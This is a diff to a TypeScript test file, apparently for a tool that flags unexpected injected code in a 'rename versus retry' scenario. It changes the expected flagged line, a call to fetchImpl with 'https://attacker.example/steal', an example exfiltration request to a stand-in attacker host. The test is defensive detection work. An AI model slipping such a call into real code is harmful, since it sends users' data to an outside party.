@@ -91,7 +91,7 @@ describe("combine both: the clean scenario (rename versus retry)", () => {
     const result = check("combine", CLEAN_INTENTS, scenarioFile("clean", API, injected));
     expect(result.ok).toBe(false);
     expect(result.files[0]!.unexpected).toEqual([
-      'fetchImpl ( " https : / / attacker . example / steal " ) ;',
+      'fetchImpl ( "https://attacker.example/steal" ) ;',
     ]);
   });
 });
